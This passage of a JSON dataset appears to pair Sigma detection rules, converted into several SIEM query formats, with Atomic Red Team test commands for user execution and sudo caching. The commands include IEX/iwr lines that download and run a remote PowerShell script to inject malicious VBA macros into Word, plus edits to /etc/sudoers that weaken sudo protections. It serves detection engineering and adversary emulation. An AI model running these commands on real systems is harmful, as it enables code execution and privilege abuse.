*\\\\\\\\svchost.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\WINWORD.EXE\" OR ParentImage=\"*\\\\\\\\EXCEL.EXE\" OR ParentImage=\"*\\\\\\\\POWERPNT.exe\" OR ParentImage=\"*\\\\\\\\MSPUB.exe\" OR ParentImage=\"*\\\\\\\\VISIO.exe\" OR ParentImage=\"*\\\\\\\\OUTLOOK.EXE\") (Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\" OR Image=\"*\\\\\\\\sh.exe\" OR Image=\"*\\\\\\\\bash.exe\" OR Image=\"*\\\\\\\\scrcons.exe\" OR Image=\"*\\\\\\\\schtasks.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\hh.exe\" OR Image=\"*\\\\\\\\wmic.exe\" OR Image=\"*\\\\\\\\mshta.exe\" OR Image=\"*\\\\\\\\rundll32.exe\" OR Image=\"*\\\\\\\\msiexec.exe\" OR Image=\"*\\\\\\\\forfiles.exe\" OR Image=\"*\\\\\\\\scriptrunner.exe\" OR Image=\"*\\\\\\\\mftrace.exe\" OR Image=\"*\\\\\\\\AppVLP.exe\" OR Image=\"*\\\\\\\\svchost.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\WINWORD.EXE\", \"*\\\\\\\\EXCEL.EXE\", \"*\\\\\\\\POWERPNT.exe\", \"*\\\\\\\\MSPUB.exe\", \"*\\\\\\\\VISIO.exe\", \"*\\\\\\\\OUTLOOK.EXE\"] Image IN [\"*\\\\\\\\cmd.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\sh.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\scrcons.exe\", \"*\\\\\\\\schtasks.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\hh.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\mshta.exe\", \"*\\\\\\\\rundll32.exe\", \"*\\\\\\\\msiexec.exe\", \"*\\\\\\\\forfiles.exe\", \"*\\\\\\\\scriptrunner.exe\", \"*\\\\\\\\mftrace.exe\", \"*\\\\\\\\AppVLP.exe\", \"*\\\\\\\\svchost.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\WINWORD\\\\.EXE|.*.*\\\\EXCEL\\\\.EXE|.*.*\\\\POWERPNT\\\\.exe|.*.*\\\\MSPUB\\\\.exe|.*.*\\\\VISIO\\\\.exe|.*.*\\\\OUTLOOK\\\\.EXE))(?=.*(?:.*.*\\\\cmd\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\sh\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\scrcons\\\\.exe|.*.*\\\\schtasks\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\hh\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\mshta\\\\.exe|.*.*\\\\rundll32\\\\.exe|.*.*\\\\msiexec\\\\.exe|.*.*\\\\forfiles\\\\.exe|.*.*\\\\scriptrunner\\\\.exe|.*.*\\\\mftrace\\\\.exe|.*.*\\\\AppVLP\\\\.exe|.*.*\\\\svchost\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: MS Office Product Spawning Exe in User Dir\nid: aa3a6f94-890e-4e22-b634-ffdfd54792cc\nstatus: experimental\ndescription: Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio\nreferences:\n    - sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c\n    - https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1059\n    - attack.t1202\n    - FIN7\n    - car.2013-05-002\nauthor: Jason Lynch \ndate: 2019/04/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\WINWORD.EXE'\n            - '*\\EXCEL.EXE'\n            - '*\\POWERPNT.exe'\n            - '*\\MSPUB.exe'\n            - '*\\VISIO.exe'\n            - '*\\OUTLOOK.EXE'\n        Image:\n            - 'C:\\users\\\\*.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MS Office Product Spawning Exe in User Dir\nid: aa3a6f94-890e-4e22-b634-ffdfd54792cc\nstatus: experimental\ndescription: Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio\nreferences:\n    - sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c\n    - https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1059\n    - attack.t1202\n    - FIN7\n    - car.2013-05-002\nauthor: Jason Lynch \ndate: 2019/04/02\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\WINWORD.EXE'\n            - '*\\EXCEL.EXE'\n            - '*\\POWERPNT.exe'\n            - '*\\MSPUB.exe'\n            - '*\\VISIO.exe'\n            - '*\\OUTLOOK.EXE'\n        Image:\n            - 'C:\\users\\\\*.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\WINWORD.EXE OR *\\\\\\\\EXCEL.EXE OR *\\\\\\\\POWERPNT.exe OR *\\\\\\\\MSPUB.exe OR *\\\\\\\\VISIO.exe OR *\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(C\\\\:\\\\\\\\users\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MS-Office-Product-Spawning-Exe-in-User-Dir <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MS Office Product Spawning Exe in User Dir\",\\n    \"description\": \"Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1059\",\\n      \"attack.t1202\",\\n      \"FIN7\",\\n      \"car.2013-05-002\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\WINWORD.EXE OR *\\\\\\\\\\\\\\\\EXCEL.EXE OR *\\\\\\\\\\\\\\\\POWERPNT.exe OR *\\\\\\\\\\\\\\\\MSPUB.exe OR *\\\\\\\\\\\\\\\\VISIO.exe OR *\\\\\\\\\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\users\\\\\\\\\\\\\\\\*.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\WINWORD.EXE OR *\\\\\\\\\\\\\\\\EXCEL.EXE OR *\\\\\\\\\\\\\\\\POWERPNT.exe OR *\\\\\\\\\\\\\\\\MSPUB.exe OR *\\\\\\\\\\\\\\\\VISIO.exe OR *\\\\\\\\\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(C\\\\\\\\:\\\\\\\\\\\\\\\\users\\\\\\\\\\\\\\\\*.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MS Office Product Spawning Exe in User Dir\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\WINWORD.EXE *\\\\\\\\EXCEL.EXE *\\\\\\\\POWERPNT.exe *\\\\\\\\MSPUB.exe *\\\\\\\\VISIO.exe *\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(C\\\\:\\\\\\\\users\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\WINWORD.EXE\" OR ParentImage=\"*\\\\\\\\EXCEL.EXE\" OR ParentImage=\"*\\\\\\\\POWERPNT.exe\" OR ParentImage=\"*\\\\\\\\MSPUB.exe\" OR ParentImage=\"*\\\\\\\\VISIO.exe\" OR ParentImage=\"*\\\\\\\\OUTLOOK.EXE\") (Image=\"C:\\\\\\\\users\\\\\\\\*.exe\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\WINWORD.EXE\", \"*\\\\\\\\EXCEL.EXE\", \"*\\\\\\\\POWERPNT.exe\", \"*\\\\\\\\MSPUB.exe\", \"*\\\\\\\\VISIO.exe\", \"*\\\\\\\\OUTLOOK.EXE\"] Image IN [\"C:\\\\\\\\users\\\\\\\\*.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\WINWORD\\\\.EXE|.*.*\\\\EXCEL\\\\.EXE|.*.*\\\\POWERPNT\\\\.exe|.*.*\\\\MSPUB\\\\.exe|.*.*\\\\VISIO\\\\.exe|.*.*\\\\OUTLOOK\\\\.EXE))(?=.*(?:.*C:\\\\users\\\\\\\\.*\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Execution from Outlook\nid: e212d415-0e93-435f-9e1a-f29005bb4723\nstatus: experimental\ndescription: Detects EnableUnsafeClientMailRules used for Script Execution from Outlook\nreferences:\n    - https://github.com/sensepost/ruler\n    - https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.t1202\nauthor: Markus Neis\ndate: 2018/12/27\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    clientMailRules:\n        CommandLine: '*EnableUnsafeClientMailRules*'\n    outlookExec:\n        ParentImage: '*\\outlook.exe'\n        CommandLine: \\\\\\\\*\\\\*.exe\n    condition: clientMailRules or outlookExec\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Execution from Outlook\nid: e212d415-0e93-435f-9e1a-f29005bb4723\nstatus: experimental\ndescription: Detects EnableUnsafeClientMailRules used for Script Execution from Outlook\nreferences:\n    - https://github.com/sensepost/ruler\n    - https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.t1202\nauthor: Markus Neis\ndate: 2018/12/27\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    clientMailRules:\n        CommandLine: '*EnableUnsafeClientMailRules*'\n    outlookExec:\n        ParentImage: '*\\outlook.exe'\n        CommandLine: \\\\\\\\*\\\\*.exe\n    condition: clientMailRules or outlookExec\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*EnableUnsafeClientMailRules* OR (ParentImage.keyword:*\\\\\\\\outlook.exe AND CommandLine.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Execution-from-Outlook <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Execution from Outlook\",\\n    \"description\": \"Detects EnableUnsafeClientMailRules used for Script Execution from Outlook\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1059\",\\n      \"attack.t1202\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*EnableUnsafeClientMailRules* OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\outlook.exe AND CommandLine.keyword:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\*.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*EnableUnsafeClientMailRules* OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\outlook.exe AND CommandLine.keyword:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\*.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Execution from Outlook\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*EnableUnsafeClientMailRules* OR (ParentImage.keyword:*\\\\\\\\outlook.exe AND CommandLine.keyword:\\\\\\\\\\\\\\\\*\\\\\\\\*.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*EnableUnsafeClientMailRules*\" OR (ParentImage=\"*\\\\\\\\outlook.exe\" CommandLine=\"\\\\\\\\\\\\\\\\*\\\\\\\\*.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine=\"*EnableUnsafeClientMailRules*\" OR (ParentImage=\"*\\\\\\\\outlook.exe\" CommandLine=\"\\\\\\\\\\\\\\\\*\\\\\\\\*.exe\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*EnableUnsafeClientMailRules.*|.*(?:.*(?=.*.*\\\\outlook\\\\.exe)(?=.*\\\\\\\\\\\\\\\\.*\\\\\\\\.*\\\\.exe))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"16.0\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "name": null}, {"source": "atomics/T1204/T1204.yaml", "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "name": null}], "command_list": ["IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"16.0\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"Word\"\n", "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"16.0\" \"#{ms_product}\"\n"], "technique_id": "T1204", "parsed_datasets": [{"Atomic Red Team Test - User Execution": {"display_name": "User Execution", "atomic_tests": [{"dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n"}], "supported_platforms": ["windows"], "name": "OSTap Style Macro Execution", "executor": {"elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "name": "powershell", "cleanup_command": "if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}, "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns \nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n", "input_arguments": {"ms_product": {"default": "Word", "type": "String", "description": "Maldoc application Word or Excel"}, "jse_path": {"default": "C:\\Users\\Public\\art.jse", "type": "String", "description": "Path for the macro to write out the \"malicious\" .jse file\n"}, "ms_office_version": {"default": "16.0", "type": "String", "description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\""}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n"}], "supported_platforms": ["windows"], "name": "Maldoc choice flags command execution", "executor": {"elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}, "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "input_arguments": {"ms_product": {"default": "Word", "type": "String", "description": "Maldoc application Word or Excel"}, "ms_office_version": {"default": "16.0", "type": "String", "description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\""}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys\n", "get_prereq_command": "$msword = New-Object -ComObject word.application\nStop-Process -Name WINWORD\n", "prereq_command": "If (Test-Path HKCU:SOFTWARE\\Microsoft\\Office\\#{ms_office_version}) { exit 0 } else { exit 1 }\n"}], "supported_platforms": ["windows"], "name": "OSTAP JS version", "executor": {"elevation_required": false, "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\")\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc $macrocode \"#{ms_office_version}\" \"#{ms_product}\"\n", "name": "powershell", "cleanup_command": "if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }\nRemove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Office\\#{ms_office_version}\\#{ms_product}\\Security\\' -Name 'AccessVBOM' -ErrorAction Ignore\n"}, "description": "Malicious JavaScript executing CMD which spaws wscript.exe //e:jscript \nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "input_arguments": {"ms_product": {"default": "Word", "type": "String", "description": "Maldoc application Word or Excel"}, "jse_path": {"default": "C:\\Users\\Public\\art.jse", "type": "Path", "description": "jse file to execute with wscript"}, "ms_office_version": {"default": "16.0", "type": "String", "description": "Microsoft Office version number found in \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\""}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1204"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1206/T1206.yaml", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "name": null}, {"source": "atomics/T1206/T1206.yaml", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"", "name": null}], "command_list": ["sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n", "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers", "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> 